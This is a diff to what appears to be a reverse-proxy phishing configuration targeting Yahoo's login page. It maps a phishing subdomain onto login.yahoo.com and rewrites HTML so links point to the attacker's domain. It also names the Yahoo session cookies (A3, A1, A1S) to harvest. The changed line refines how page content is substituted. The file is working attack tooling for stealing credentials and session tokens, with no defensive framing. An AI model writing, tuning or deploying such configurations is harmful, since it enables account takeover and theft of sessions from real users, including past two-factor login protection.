@@ -3,7 +3,7 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '{{.Endpoint1}}', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: true}
 sub_filters:
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', phish_sub: '{{.Endpoint1}}', mimes: ['text/html', 'application/javascript', 'application/x-javascript', 'application/json']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html']}
 auth_tokens:
   - domain: '.yahoo.com'
     keys: ['A3', 'A1', 'A1S']
